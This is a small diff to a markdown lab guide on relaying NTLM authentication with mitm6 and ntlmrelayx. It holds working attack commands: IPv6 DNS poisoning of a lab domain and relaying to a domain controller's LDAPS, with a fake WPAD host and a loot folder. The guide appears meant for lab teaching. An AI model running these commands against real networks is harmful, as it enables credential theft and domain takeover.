@@ -9,14 +9,14 @@ In this guide, we will use **Mitm6** alongside **ntlmrelayx** to perform a relay
 
 ## **Lab Setup:**
 ### Step 1: Prepare the Mitm6 Command
-First, open a terminal and prepare to run Mitm6 with the following command: `sudo mitm6 -d quigley.local
+First, open a terminal and prepare to run Mitm6 with the following command: `sudo mitm6 -d quigley.local`
 
 ### Step 2
 
 `ntlmrelayx.py -6 -t ldaps://192.168.163.5 -wh fakewpad.quigley.local -l lootme`
 
 - `-6` specifies IPv6.
-- `-t` defines the target (LDAPS in this case).
+- `-t` defines the target (LDAPS in this case)(DC).
 - `-wh` points to the WPAD (Web Proxy Auto-Discovery Protocol) URL.
 - `-l` specifies the folder where looted information will be saved.
 
